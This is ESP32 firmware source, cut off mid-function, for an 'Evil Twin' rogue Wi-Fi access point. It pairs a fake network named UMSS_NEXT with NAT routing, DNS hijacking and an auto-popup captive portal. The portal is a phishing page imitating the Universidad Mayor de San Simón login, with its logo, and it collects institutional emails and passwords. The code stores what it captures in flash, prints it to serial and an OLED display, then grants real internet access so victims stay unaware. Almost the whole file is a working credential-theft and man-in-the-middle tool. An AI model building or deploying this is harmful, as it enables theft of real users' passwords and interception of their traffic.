/*
================================================================================
EVIL TWIN APSTA - REPETIDOR REAL + MITM v5.0
Autor     : Deyni - Sociedad Científica UMSS San Simón
================================================================================
CÓMO FUNCIONA:
  1. ESP32 se conecta a ZTE_2.4Ghost-EXT (red real) como STA
  2. ESP32 crea red falsa MOVISTAR_Guest como AP
  3. ip_napt_enable() activa NAT entre AP y STA
     → los clientes del AP tienen internet real (son enrutados por ESP32)
  4. DNS wildcard redirige todas las peticiones al portal cautivo
  5. Portal captura credenciales → las guarda en SPIFFS
  6. Tras captura, el cliente tiene internet real (MITM completo)

FLUJO MITM:
  Teléfono ──► MOVISTAR_Guest (AP falso)
                    │
               ESP32 (NAT)   ◄── intercepta tráfico HTTP
                    │
              ZTE_2.4Ghost-EXT ──► Internet

CAPTIVE PORTAL AUTO-POPUP:
  - generate_204 / hotspot-detect / ncsi → respuestas de portal
  - Al conectar al AP, el OS muestra notificación automática
================================================================================
*/


#include <WiFi.h>
#include <WebServer.h>
#include <WiFiUdp.h>          // DNS forwarder propio (secuestro / reenvio)
#include <SPIFFS.h>
#include <WiFiClient.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SH110X.h>   // pantalla SH1106 (no SSD1306)
#include "lwip/lwip_napt.h"   // NAPT — requiere liblwip.a con NAPT compilado
#include "lwip/tcpip.h"       // LOCK_TCPIP_CORE / UNLOCK_TCPIP_CORE (IDF 5.x core-locking)

// ============================================================================
// CONFIGURACIÓN
// ============================================================================

// Credenciales de TU red real: viven en credenciales_wifi.h (NO se sube a git).
// Copia credenciales_wifi.ejemplo.h -> credenciales_wifi.h y pon tus datos.
#include "credenciales_wifi.h"

const char* SSID_REAL = SSID_REAL_CFG;
const char* PASS_REAL = PASS_REAL_CFG;

const char* SSID_FAKE = "UMSS_NEXT";
const char* PASS_FAKE = "12345678";

const IPAddress IP_AP  (192, 168, 4, 1);
const IPAddress GW_AP  (192, 168, 4, 1);
const IPAddress MASK_AP(255, 255, 255, 0);

// DNS real al que reenviar cuando el internet esta abierto (repetidor)
const IPAddress DNS_UPSTREAM(8, 8, 8, 8);

// Si true: el cliente tiene internet desde el inicio (repetidor puro, el portal
// no se fuerza). Si false: primero secuestra DNS (portal salta) y abre internet
// tras capturar credenciales. Cambia a true si solo quieres probar el enrutado.
#define ABRIR_INTERNET_AL_INICIO   false   // false = modo portal (iOS abre el login automatico)

// ============================================================================
// PINES
// ============================================================================

#define BUZZER_PIN  4
#define LED_R_PIN   5
#define LED_G_PIN   18
#define LED_B_PIN   19

// OLED SH1106 128x64 por I2C (SDA=21, SCL=22)
#define OLED_SDA    21
#define OLED_SCL    22
#define OLED_W      128
#define OLED_H      64
#define OLED_ADDR   0x3C

// ============================================================================
// ESTADO WIFI STA
// ============================================================================

enum EstadoSTA { STA_PENDIENTE, STA_CONECTANDO, STA_CONECTADO, STA_REINTENTANDO };

EstadoSTA     estadoSTA    = STA_PENDIENTE;
unsigned long tInicioSTA   = 0;
unsigned long tReintento   = 0;
bool          natActivo    = false;

#define STA_TIMEOUT_MS  20000
#define STA_RETRY_MS    12000

// ============================================================================
// GLOBALES
// ============================================================================

WebServer  server(80);
WiFiServer server443(443);

// DNS propio (puerto 53): modo secuestro (portal) o resolucion real (internet)
WiFiUDP    dnsUDP;                        // recibe consultas de los clientes
bool       secuestro_dns = true;          // true=portal (hijack), false=internet real
byte       dnsbuf[512];

// Cache DNS: evita llamar a hostByName (que bloquea) en dominios ya resueltos.
#define DNS_CACHE_N   24
struct DnsCache { char dom[40]; IPAddress ip; unsigned long expira; };
DnsCache   dnscache[DNS_CACHE_N];
int        dnscache_idx = 0;

bool dns_cache_buscar(const String& dom, IPAddress& ip) {
  for (int i = 0; i < DNS_CACHE_N; i++) {
    if (dnscache[i].dom[0] && dom == dnscache[i].dom && millis() < dnscache[i].expira) {
      ip = dnscache[i].ip;
      return true;
    }
  }
  return false;
}

void dns_cache_guardar(const String& dom, IPAddress ip) {
  DnsCache& e = dnscache[dnscache_idx];
  dom.toCharArray(e.dom, sizeof(e.dom));
  e.ip = ip;
  e.expira = millis() + 120000UL;          // 2 min
  dnscache_idx = (dnscache_idx + 1) % DNS_CACHE_N;
}

int           creds_count = 0;
unsigned long t_inicio    = 0;

// Última credencial capturada (para mostrarla en el OLED)
String        ultimo_user = "";
String        ultimo_pass = "";

// ============================================================================
// OLED + ESCANEO WIFI
// ============================================================================

Adafruit_SH1106G oled(OLED_W, OLED_H, &Wire, -1);
bool oledOK = false;

// Escaneo WiFi asíncrono (no bloqueante): resultados guardados para la pantalla
#define SCAN_MAX      8         // redes a mostrar como máximo
#define SCAN_PERIOD   30000     // relanzar escaneo cada 30s (bajo, para no tirar clientes del AP)

struct RedWifi { char ssid[20]; int rssi; int canal; };
RedWifi        redes[SCAN_MAX];
int            redes_n      = 0;
bool           scan_activo  = false;
unsigned long  t_scan       = 0;

// Rotación de pantallas del OLED: Estado MITM / Red real / Escaneo WiFi
enum PantallaOLED { PANT_DASHBOARD, PANT_REDREAL, PANT_SCAN, PANT_TOTAL };
int            pantalla     = PANT_DASHBOARD;
unsigned long  t_pantalla   = 0;
#define PANT_PERIOD   5000      // cambiar de pantalla cada 5s

// Alerta de credencial capturada: sobrepone una pantalla grande unos segundos
unsigned long  t_alerta     = 0;
#define ALERTA_MS     4000

// ============================================================================
// BUZZER / LED
// ============================================================================

void buzzer_beep(int ms) { digitalWrite(BUZZER_PIN, HIGH); delay(ms); digitalWrite(BUZZER_PIN, LOW); }
void buzzer_alerta() { buzzer_beep(100); delay(50); buzzer_beep(100); delay(50); buzzer_beep(100); }
void buzzer_ok()     { buzzer_beep(150); delay(80); buzzer_beep(500); }

void led_color(int r, int g, int b) {
  analogWrite(LED_R_PIN, r); analogWrite(LED_G_PIN, g); analogWrite(LED_B_PIN, b);
}
void led_verde()    { led_color(0,   255, 0);   }  // listo, sin STA
void led_azul()     { led_color(0,   0,   255); }  // STA conectando
void led_cyan()     { led_color(0,   255, 255); }  // MITM completo (NAT activo)
void led_amarillo() { led_color(255, 200, 0);   }  // cliente en AP
void led_rojo()     { led_color(255, 0,   0);   }  // credencial capturada
void led_apagar()   { led_color(0,   0,   0);   }

// ============================================================================
// SPIFFS
// ============================================================================

void inicializar_spiffs() {
  if (!SPIFFS.begin(true)) { Serial.println("[SPIFFS] ERROR"); return; }
  Serial.println("[SPIFFS] OK");
}

void guardar_credencial(String u, String p) {
  File f = SPIFFS.open("/credenciales.txt", "a");
  if (!f) return;
  f.print(u); f.print("|"); f.println(p);
  f.close();
  creds_count++;
  ultimo_user = u;
  ultimo_pass = p;
  t_alerta    = millis();   // dispara la alerta grande en el OLED
  secuestro_dns = false;    // abre internet real: el DNS pasa a reenvio (MITM completo)
  Serial.println("\n========== CREDENCIAL CAPTURADA ==========");
  Serial.print("  Usuario  : "); Serial.println(u);
  Serial.print("  Password : "); Serial.println(p);
  Serial.print("  Total    : "); Serial.println(creds_count);
  Serial.println("==========================================\n");
  buzzer_alerta();
  led_rojo();
  delay(800);
}

void leer_credenciales() {
  File f = SPIFFS.open("/credenciales.txt", "r");
  if (!f || f.size() == 0) { Serial.println("[SPIFFS] Vacío."); return; }
  Serial.println("\n===== CREDENCIALES =====");
  int n = 1;
  while (f.available()) {
    Serial.print("["); Serial.print(n++); Serial.print("] ");
    Serial.println(f.readStringUntil('\n'));
  }
  Serial.println("========================\n");
  f.close();
}

// ============================================================================
// OLED — inicialización, escaneo WiFi async y pantallas
// ============================================================================

void inicializar_oled() {
  Wire.begin(OLED_SDA, OLED_SCL);
  Wire.setClock(400000);   // 400kHz: refresco mas rapido
  oled.begin(OLED_ADDR, true);   // SH1106: begin(addr, reset)
  oledOK = true;
  oled.clearDisplay();
  oled.setTextColor(SH110X_WHITE);
  // Splash de arranque (128x64)
  oled.setTextSize(2);
  oled.setCursor(6, 8);
  oled.print("EVIL");
  oled.setCursor(6, 28);
  oled.print("TWIN");
  oled.setTextSize(1);
  oled.setCursor(0, 52);
  oled.print("MITM - UMSS S.Cient.");
  oled.drawRect(0, 0, OLED_W, OLED_H, SH110X_WHITE);
  oled.display();
  Serial.println("[OLED] OK (SH1106 128x64 @0x3C)");
}

// Lanza y recoge escaneos WiFi de forma no bloqueante (WiFi.scanNetworks async)
void gestionar_scan() {
  if (!scan_activo && millis() - t_scan > SCAN_PERIOD) {
    WiFi.scanNetworks(true, false);   // async=true, show_hidden=false
    scan_activo = true;
    t_scan = millis();
    return;
  }
  if (scan_activo) {
    int n = WiFi.scanComplete();
    if (n >= 0) {                     // escaneo terminado
      redes_n = (n > SCAN_MAX) ? SCAN_MAX : n;
      for (int i = 0; i < redes_n; i++) {
        String s = WiFi.SSID(i);
        if (s.length() == 0) s = "<oculta>";
        s.toCharArray(redes[i].ssid, sizeof(redes[i].ssid));
        redes[i].rssi  = WiFi.RSSI(i);
        redes[i].canal = WiFi.channel(i);
      }
      WiFi.scanDelete();
      scan_activo = false;
    }
  }
}

// ---- Helpers de dibujo ---------------------------------------------------

// Barra de señal (0-4 bloques) a partir del RSSI
int rssi_a_barras(int rssi) {
  if (rssi >= -55) return 4;
  if (rssi >= -65) return 3;
  if (rssi >= -75) return 2;
  if (rssi >= -85) return 1;
  return 0;
}

// Icono de 4 barras de señal; esquina inferior-izq en (x, y+8)
void icono_barras(int x, int y, int nivel) {
  for (int k = 0; k < 4; k++) {
    int bh = 2 + k * 2;
    int bx = x + k * 5;
    if (k < nivel) oled.fillRect(bx, y + 8 - bh, 3, bh, SH110X_WHITE);
    else           oled.drawRect(bx, y + 8 - bh, 3, bh, SH110X_WHITE);
  }
}

// Badge (etiqueta) invertida en una posicion dada
void oled_badge(int x, int y, const char* txt, bool activo) {
  int w = strlen(txt) * 6 + 4;
  if (activo) {
    oled.fillRect(x, y - 1, w, 10, SH110X_WHITE);
    oled.setTextColor(SH110X_BLACK);
  } else {
    oled.drawRect(x, y - 1, w, 10, SH110X_WHITE);
    oled.setTextColor(SH110X_WHITE);
  }
  oled.setCursor(x + 2, y);
  oled.print(txt);
  oled.setTextColor(SH110X_WHITE);
}

// Barra de título invertida (texto negro sobre blanco)
void oled_header(const char* titulo) {
  oled.fillRect(0, 0, OLED_W, 11, SH110X_WHITE);
  oled.setTextColor(SH110X_BLACK);
  oled.setTextSize(1);
  oled.setCursor(2, 2);
  oled.print(titulo);
  oled.setTextColor(SH110X_WHITE);
}

// ---- Pantalla 1: Estado MITM (128x64) -----------------------------------
void dibujar_dashboard() {
  oled.clearDisplay();
  oled_header("ESTADO MITM");

  // AP falso
  oled.setCursor(0, 14);
  oled.print("AP:");
  oled.print(SSID_FAKE);

  // Clientes conectados
  oled.setCursor(0, 24);
  oled.print("Clientes: ");
  oled.print(WiFi.softAPgetStationNum());

  // STA (red real): estado + barras de señal
  oled.setCursor(0, 34);
  if (estadoSTA == STA_CONECTADO) {
    oled.print("STA ");
    oled.print(WiFi.RSSI());
    oled.print("dBm");
    icono_barras(104, 33, rssi_a_barras(WiFi.RSSI()));
  } else if (estadoSTA == STA_CONECTANDO) {
    oled.print("STA: conectando..");
  } else {
    oled.print("STA: ---");
  }

  // NAT + estado de internet como badges
  oled.setCursor(0, 45);
  oled.print("NAT");
  oled_badge(24, 44, natActivo ? "ON" : "OFF", natActivo);
  oled_badge(60, 44, secuestro_dns ? "PORTAL" : "INTERNET", !secuestro_dns);

  // Credenciales capturadas
  oled.setCursor(0, 55);
  oled.print("Creds: ");
  oled.print(creds_count);

  oled.display();
}

// ---- Pantalla 2: Red real (STA) -----------------------------------------
void dibujar_red_real() {
  oled.clearDisplay();
  oled_header("RED REAL (STA)");

  oled.setCursor(0, 14);
  oled.print(SSID_REAL);

  if (estadoSTA == STA_CONECTADO) {
    oled.setCursor(0, 24);
    oled.print(WiFi.BSSIDstr());          // MAC del router real

    oled.setCursor(0, 34);
    oled.print("Canal:");
    oled.print(WiFi.channel());
    oled.setCursor(70, 34);
    oled.print(WiFi.RSSI());
    oled.print("dBm");
    icono_barras(110, 33, rssi_a_barras(WiFi.RSSI()));

    oled.setCursor(0, 44);
    oled.print("IP :");
    oled.print(WiFi.localIP());

    oled.setCursor(0, 54);
    oled.print("Up :");
    oled.print((millis() - t_inicio) / 1000);
    oled.print("s");
  } else {
    oled.setCursor(0, 30);
    oled.print("Sin conexion STA");
    oled.setCursor(0, 44);
    oled.print("Up :");
    oled.print((millis() - t_inicio) / 1000);
    oled.print("s");
  }
  oled.display();
}

// ---- Pantalla 3: Escaneo WiFi -------------------------------------------
void dibujar_scan() {
  oled.clearDisplay();
  char cab[22];
  snprintf(cab, sizeof(cab), "REDES WIFI (%d)", redes_n);
  oled_header(cab);

  if (redes_n == 0) {
    oled.setCursor(0, 26);
    oled.print(scan_activo ? "Escaneando..." : "Sin datos aun");
    oled.display();
    return;
  }

  int y = 13;
  int filas = (redes_n > 5) ? 5 : redes_n;   // hasta 5 filas visibles
  for (int i = 0; i < filas; i++) {
    oled.setCursor(0, y);
    char linea[13];
    strncpy(linea, redes[i].ssid, 12); linea[12] = 0;
    oled.print(linea);
    oled.setCursor(78, y);
    oled.print("c");
    oled.print(redes[i].canal);
    icono_barras(104, y, rssi_a_barras(redes[i].rssi));
    y += 10;
  }
  oled.display();
}

// ---- Overlay: alerta de credencial capturada (128x64) -------------------
void dibujar_alerta() {
  oled.clearDisplay();
  oled.drawRect(0, 0, OLED_W, OLED_H, SH110X_WHITE);
  oled.drawRect(2, 2, OLED_W - 4, OLED_H - 4, SH110X_WHITE);

  oled.setTextSize(2);
  oled.setCursor(10, 8);
  oled.print("CRED!");

  oled.setTextSize(1);
  // Usuario (recortado)
  oled.setCursor(8, 30);
  oled.print("U:");
  oled.print(ultimo_user.substring(0, 16));

  // Password parcialmente enmascarada
  oled.setCursor(8, 42);
  oled.print("P:");
  String p = ultimo_pass;
  String masc = p.substring(0, 2);
  for (int i = 2; i < (int)p.length() && i < 10; i++) masc += "*";
  oled.print(masc);

  oled.setCursor(8, 54);
  oled.print("Total: ");
  oled.print(creds_count);

  oled.display();
}

void gestionar_oled() {
  if (!oledOK) return;

  // Alerta grande tras capturar credencial: sobrepone unos segundos
  if (t_alerta != 0 && millis() - t_alerta < ALERTA_MS) {
    dibujar_alerta();
    return;
  }

  // Rotar de pantalla cada PANT_PERIOD
  if (millis() - t_pantalla >= PANT_PERIOD) {
    t_pantalla = millis();
    pantalla = (pantalla + 1) % PANT_TOTAL;
  }
  // Redibujar la pantalla actual
  switch (pantalla) {
    case PANT_REDREAL: dibujar_red_real(); break;
    case PANT_SCAN:    dibujar_scan();     break;
    default:           dibujar_dashboard();break;
  }
}

// ============================================================================
// HTML PORTAL
// ============================================================================

const char HTML_PORTAL[] PROGMEM = R"====(
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>UMSS · Acceso a la red</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(160deg,#38286B,#241646);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.c{background:#fff;border-radius:14px;box-shadow:0 16px 48px rgba(0,0,0,.4);padding:30px 26px;max-width:400px;width:100%}
.logo-umss{display:flex;justify-content:center;margin-bottom:14px}
.logo-umss svg{height:100px;width:auto;display:block}
.u{text-align:center;color:#38286B;font-size:15px;font-weight:800;line-height:1.25}
.red{text-align:center;color:#C12E36;font-size:12px;font-weight:700;margin-top:3px;letter-spacing:.02em}
.sub{text-align:center;color:#666;font-size:12.5px;margin:14px 0 22px;line-height:1.5}
label{font-size:12.5px;font-weight:700;color:#333;display:block;margin-bottom:5px;margin-top:14px}
input{width:100%;padding:12px 14px;border:1.5px solid #cfd8e3;border-radius:8px;font-size:15px}
input:focus{outline:none;border-color:#38286B}
.btn{margin-top:22px;width:100%;padding:14px;background:#38286B;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:700;cursor:pointer}
.btn:hover{background:#241646}
.ft{text-align:center;font-size:10.5px;color:#9aa7b8;margin-top:20px;line-height:1.5}
</style>
</head>
<body>
<div class="c">
  <div class="logo-umss"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" y="0px" width="674.184px" height="1023.071px" viewBox="0 0 674.184 1023.071" xml:space="preserve"><g id="Capa_8" display="none"><g display="inline"><polygon fill="#FFFFFF" points="559.449,174.107 337.09,848.964 114.734,174.107 "/></g><g display="inline"><polygon fill="#C12E36" points="337.092,319.69 558.599,175.13 479.212,417.625 "/><polygon fill="#C12E36" points="337.092,319.69 114.733,174.575 194.97,417.626 "/><polygon fill="none" stroke="#352566" stroke-width="6" stroke-miterlimit="10" points="559.45,174.107 337.09,848.964 114.733,174.107 "/><g><polygon fill="#38286B" points="358.833,383.34 372.3,424.785 337.045,450.398 301.79,424.785 315.256,383.34 "/><g><g><line fill="none" stroke="#352566" stroke-width="4" stroke-miterlimit="10" x1="370.3" y1="424.785" x2="302.918" y2="593.785"/><g><polygon fill="#352566" points="298.203,586.786 295.044,613.536 311.157,591.95 "/></g></g></g><g><g><line fill="none" stroke="#352566" stroke-width="4" stroke-miterlimit="10" x1="303.79" y1="424.804" x2="371.255" y2="593.77"/><g><polygon fill="#352566" points="363.017,591.94 379.14,613.517 375.968,586.768 "/></g></g></g><g><g><line fill="none" stroke="#352566" stroke-width="4" stroke-miterlimit="10" x1="337.045" y1="449.398" x2="337.045" y2="706.273"/><g><polygon fill="#352566" points="330.072,701.518 337.045,727.536 344.018,701.518 "/></g></g></g><polygon fill="#FFFFFF" points="327.95,425.216 322.948,409.821 336.044,400.307 349.14,409.821 344.138,425.216 "/><polygon fill="#0F5A96" points="337.045,394.784 358.845,383.324 354.679,407.598 372.315,424.788 347.944,428.33 337.045,450.414 326.146,428.33 301.773,424.788 319.41,407.598 315.246,383.324 "/><polygon fill="#FFFFFF" points="326.174,428.317 319.438,407.584 337.073,394.77 354.71,407.584 347.974,428.317 "/></g><g><path fill="#38286B" d="M255.003,190.786h13.957v26.971c0,2.675-0.417,5.2-1.25,7.576s-2.141,4.454-3.922,6.233 s-3.649,3.029-5.604,3.749c-2.717,1.008-5.98,1.512-9.789,1.512c-2.203,0-4.606-0.154-7.21-0.463 c-2.604-0.309-4.781-0.92-6.531-1.836c-1.75-0.915-3.351-2.217-4.802-3.903s-2.445-3.425-2.98-5.215 c-0.864-2.88-1.297-5.432-1.297-7.653v-26.971h13.958v27.613c0,2.469,0.684,4.396,2.054,5.785 c1.369,1.389,3.268,2.082,5.697,2.082c2.409,0,4.297-0.684,5.667-2.052c1.369-1.367,2.054-3.306,2.054-5.815V190.786z"/></g><g><path fill="#38286B" d="M286.459,191.172h18.396l7.095,27.544l7.044-27.544h18.385v45.269h-11.456v-34.523l-8.827,34.523h-10.37 l-8.811-34.523v34.523h-11.456V191.172z"/></g><g><path fill="#38286B" d="M354.758,221.464l13.31-0.833c0.288,2.162,0.874,3.809,1.76,4.94c1.44,1.833,3.499,2.749,6.176,2.749 c1.996,0,3.536-0.468,4.616-1.405c1.081-0.937,1.621-2.022,1.621-3.258c0-1.173-0.515-2.223-1.544-3.149 s-3.417-1.801-7.164-2.625c-6.135-1.379-10.509-3.211-13.123-5.496c-2.636-2.285-3.953-5.198-3.953-8.739 c0-2.326,0.675-4.524,2.023-6.593c1.348-2.069,3.376-3.695,6.083-4.879c2.706-1.184,6.417-1.776,11.132-1.776 c5.784,0,10.194,1.076,13.231,3.227c3.036,2.151,4.843,5.574,5.419,10.267l-13.185,0.772c-0.351-2.038-1.087-3.521-2.208-4.447 c-1.122-0.926-2.671-1.39-4.647-1.39c-1.627,0-2.852,0.345-3.675,1.035c-0.823,0.69-1.235,1.528-1.235,2.517 c0,0.721,0.34,1.369,1.02,1.945c0.658,0.597,2.223,1.153,4.693,1.667c6.114,1.317,10.493,2.651,13.139,3.999 s4.57,3.021,5.774,5.018c1.205,1.997,1.807,4.23,1.807,6.701c0,2.903-0.803,5.579-2.408,8.029 c-1.605,2.45-3.85,4.308-6.731,5.574c-2.883,1.266-6.516,1.899-10.9,1.899c-7.7,0-13.031-1.482-15.996-4.447 C356.827,229.802,355.148,226.035,354.758,221.464z"/></g><g><path fill="#38286B" d="M411.332,221.464l13.31-0.833c0.288,2.162,0.874,3.809,1.76,4.94c1.44,1.833,3.499,2.749,6.176,2.749 c1.996,0,3.536-0.468,4.616-1.405c1.081-0.937,1.621-2.022,1.621-3.258c0-1.173-0.515-2.223-1.544-3.149 s-3.417-1.801-7.164-2.625c-6.135-1.379-10.509-3.211-13.123-5.496c-2.636-2.285-3.953-5.198-3.953-8.739 c0-2.326,0.675-4.524,2.023-6.593c1.348-2.069,3.376-3.695,6.083-4.879c2.706-1.184,6.417-1.776,11.132-1.776 c5.784,0,10.194,1.076,13.231,3.227c3.036,2.151,4.843,5.574,5.419,10.267l-13.185,0.772c-0.351-2.038-1.087-3.521-2.208-4.447 c-1.122-0.926-2.671-1.39-4.647-1.39c-1.627,0-2.852,0.345-3.675,1.035c-0.823,0.69-1.235,1.528-1.235,2.517 c0,0.721,0.34,1.369,1.02,1.945c0.658,0.597,2.223,1.153,4.693,1.667c6.114,1.317,10.493,2.651,13.139,3.999 s4.57,3.021,5.774,5.018c1.205,1.997,1.807,4.23,1.807,6.701c0,2.903-0.803,5.579-2.408,8.029 c-1.605,2.45-3.85,4.308-6.731,5.574c-2.883,1.266-6.516,1.899-10.9,1.899c-7.7,0-13.031-1.482-15.996-4.447 C413.401,229.802,411.723,226.035,411.332,221.464z"/></g></g></g><g id="Capa_8_copia"><g><polygon fill="#FFFFFF" points="669.702,6.798 337.09,1016.273 4.481,6.798 "/></g><g><polygon fill="#C12E36" points="337.092,220.988 668.751,4.542 549.887,367.624 "/><polygon fill="#C12E36" points="337.092,220.988 4.159,3.709 124.295,367.625 "/><path fill="#352566" d="M337.089,1023.071L0,0h674.184L337.089,1023.071z M8.316,6.017l328.772,997.828L665.867,6.017H8.316z"/><g><path fill="#352566" d="M337.056,418.757l-55.144-40.063l21.063-64.827h68.161l21.064,64.827L337.056,418.757z M286.628,377.161 l50.428,36.639l50.43-36.639l-19.264-59.282H305.89L286.628,377.161z"/><g><rect x="334.142" y="367.314" transform="matrix(0.9264 0.3764 -0.3764 0.9264 217.1857 -88.9269)" fill="#352566" width="4.011" height="287.952"/><g><polygon fill="#352566" points="277.234,638.168 273.892,664.971 290.188,643.432 "/></g></g><g><rect x="194.129" y="509.23" transform="matrix(0.3774 0.9261 -0.9261 0.3774 683.9352 5.1938)" fill="#352566" width="287.951" height="4.011"/><g><polygon fill="#352566" points="384.166,642.788 400.487,664.309 397.115,637.51 "/></g></g><g><rect x="335.087" y="415.805" fill="#352566" width="4.011" height="402.006"/><g><polygon fill="#352566" points="330.101,813.043 337.092,839.131 344.085,813.043 "/></g></g><g><path fill="#352566" d="M337.059,418.351l-12.916-39.753h-41.802l33.816-24.571l-12.917-39.753l33.816,24.569l33.813-24.569 l-12.914,39.754l33.816,24.57h-41.799L337.059,418.351z M328.758,378.598l8.301,25.543l8.298-25.543H328.758z M351.403,374.208 h26.856l-21.729-15.789L351.403,374.208z M327.332,374.208h19.45l6.014-18.502l-15.739-11.436l-15.737,11.435L327.332,374.208z M322.716,374.208l-5.131-15.789l-21.731,15.789H322.716z M340.792,341.557l13.429,9.758l8.301-25.546L340.792,341.557z M311.593,325.769l8.3,25.545l13.43-9.757L311.593,325.769z"/></g></g><g><path fill="#38286B" d="M214.183,27.981h20.897v40.382c0,4.005-0.625,7.787-1.871,11.345c-1.249,3.557-3.208,6.668-5.874,9.333 c-2.665,2.664-5.463,4.536-8.392,5.614c-4.066,1.509-8.955,2.263-14.656,2.263c-3.298,0-6.896-0.23-10.795-0.693 c-3.9-0.462-7.16-1.377-9.779-2.749c-2.621-1.37-5.018-3.32-7.191-5.844c-2.172-2.526-3.659-5.128-4.46-7.809 c-1.293-4.311-1.942-8.133-1.942-11.459V27.981h20.898v41.344c0,3.697,1.024,6.583,3.075,8.663 c2.051,2.08,4.893,3.119,8.53,3.119c3.605,0,6.435-1.025,8.484-3.074c2.049-2.046,3.075-4.948,3.075-8.708V27.981z"/></g><g><path fill="#38286B" d="M261.28,28.559h27.544L299.448,69.8l10.546-41.241h27.527V96.34h-17.153V44.648L307.152,96.34h-15.528 l-13.188-51.691V96.34H261.28V28.559z"/></g><g><path fill="#38286B" d="M363.542,73.916l19.93-1.249c0.431,3.238,1.307,5.704,2.636,7.398c2.156,2.743,5.237,4.116,9.247,4.116 c2.988,0,5.293-0.702,6.91-2.105c1.618-1.402,2.426-3.028,2.426-4.877c0-1.757-0.77-3.329-2.311-4.716 c-1.54-1.387-5.116-2.696-10.727-3.931c-9.186-2.064-15.735-4.809-19.648-8.229c-3.949-3.421-5.92-7.783-5.92-13.083 c0-3.484,1.009-6.774,3.028-9.872c2.02-3.098,5.056-5.533,9.11-7.305c4.052-1.772,9.608-2.658,16.667-2.658 c8.66,0,15.266,1.61,19.812,4.832c4.545,3.22,7.25,8.344,8.112,15.371l-19.74,1.158c-0.524-3.052-1.627-5.271-3.304-6.658 c-1.68-1.387-4.002-2.081-6.96-2.081c-2.436,0-4.271,0.517-5.503,1.549c-1.231,1.034-1.85,2.289-1.85,3.768 c0,1.079,0.509,2.049,1.525,2.913c0.987,0.894,3.329,1.727,7.029,2.497c9.153,1.972,15.712,3.969,19.671,5.988 c3.962,2.018,6.844,4.523,8.648,7.513c1.804,2.99,2.703,6.334,2.703,10.033c0,4.348-1.202,8.354-3.604,12.022 c-2.406,3.668-5.764,6.449-10.08,8.345c-4.316,1.895-9.755,2.843-16.321,2.843c-11.528,0-19.512-2.219-23.949-6.658 C366.643,86.399,364.128,80.758,363.542,73.916z"/></g><g><path fill="#38286B" d="M448.25,73.916l19.928-1.249c0.433,3.238,1.31,5.704,2.638,7.398c2.156,2.743,5.237,4.116,9.244,4.116 c2.987,0,5.294-0.702,6.913-2.105c1.616-1.402,2.426-3.028,2.426-4.877c0-1.757-0.771-3.329-2.309-4.716 c-1.543-1.387-5.118-2.696-10.729-3.931c-9.187-2.064-15.735-4.809-19.65-8.229c-3.943-3.421-5.92-7.783-5.92-13.083 c0-3.484,1.013-6.774,3.034-9.872c2.016-3.098,5.052-5.533,9.104-7.305c4.053-1.772,9.61-2.658,16.67-2.658 c8.66,0,15.262,1.61,19.811,4.832c4.545,3.22,7.253,8.344,8.115,15.371l-19.741,1.158c-0.527-3.052-1.628-5.271-3.308-6.658 c-1.681-1.387-3.999-2.081-6.959-2.081c-2.436,0-4.27,0.517-5.501,1.549c-1.231,1.034-1.85,2.289-1.85,3.768 c0,1.079,0.509,2.049,1.524,2.913c0.987,0.894,3.33,1.727,7.03,2.497c9.153,1.972,15.71,3.969,19.67,5.988 c3.963,2.018,6.845,4.523,8.646,7.513c1.803,2.99,2.706,6.334,2.706,10.033c0,4.348-1.204,8.354-3.607,12.022 c-2.402,3.668-5.765,6.449-10.079,8.345c-4.314,1.895-9.755,2.843-16.317,2.843c-11.532,0-19.512-2.219-23.953-6.658 C451.351,86.399,448.834,80.758,448.25,73.916z"/></g></g></g><g id="Capa_2"></g></svg></div>
  <div class="u">Universidad Mayor de San Simón</div>
  <div class="red">Red inalámbrica institucional · UMSS_NEXT</div>
  <div class="sub">Inicia sesión con tu correo institucional para acceder a Internet.</div>
  <form method="POST" action="/submit">
    <label>Correo institucional</label>
    <input type="email" name="usuario" placeholder="usuario@est.umss.edu" required autocomplete="off">
    <label>Contraseña</label>
    <input type="password" name="contrasena" placeholder="Contraseña" required>
    <button class="btn" type="submit">Acceder a la red</button>
  </form>
  <div class="ft">Dirección de Tecnologías de Información y Comunicación<br>UMSS · Cochabamba – Bolivia</div>
</div>
</body>
</html>
)====";

const char HTML_EXITO[] PROGMEM = R"====(
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>UMSS · Conectado</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(160deg,#0a3d7a,#06255c);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.c{background:#fff;border-radius:14px;box-shadow:0 16px 48px rgba(0,0,0,.4);padding:36px 30px;max-width:400px;width:100%;text-align:center}
.ok{font-size:56px;margin-bottom:12px;color:#1e9e5a}
h2{color:#0a3d7a;font-size:20px;margin-bottom:10px}
p{color:#666;font-size:13.5px;line-height:1.6}
.go{display:inline-block;margin-top:22px;padding:12px 24px;background:#0a3d7a;color:#fff;text-decoration:none;border-radius:8px;font-weight:700}
.logo{font-size:16px;font-weight:800;color:#0a3d7a;margin-top:24px}
</style>
</head>
<body>
<div class="c">
  <div class="ok">&#10003;</div>
  <h2>Acceso concedido</h2>
  <p>Sesión verificada correctamente.<br>Espera unos segundos y podrás navegar.</p>
  <a class="go" href="http://neverssl.com">Continuar a Internet</a>
  <div class="logo">UMSS · Red institucional</div>
</div>
</body>
</html>
)====";

// ============================================================================
// HANDLERS HTTP
// ============================================================================

void log_req() {
  Serial.print("[HTTP] ");
  Serial.print(server.method() == HTTP_GET ? "GET " : "POST ");
  Serial.print(server.hostHeader());
  Serial.println(server.uri());
}

void send_redirect(const char* url) {
  server.sendHeader("Location", url, true);
  server.sendHeader("Cache-Control", "no-cache");
  server.send(302, "text/plain", "Redirect");
}

void handle_portal() {
  log_req();
  server.send_P(200, "text/html; charset=UTF-8", HTML_PORTAL);
}

void handle_submit() {
  if (server.method() != HTTP_POST) { handle_portal(); return; }
  String u = server.arg("usuario");
  String p = server.arg("contrasena");
  if (u.length() > 0 && p.length() > 0) {
    guardar_credencial(u, p);
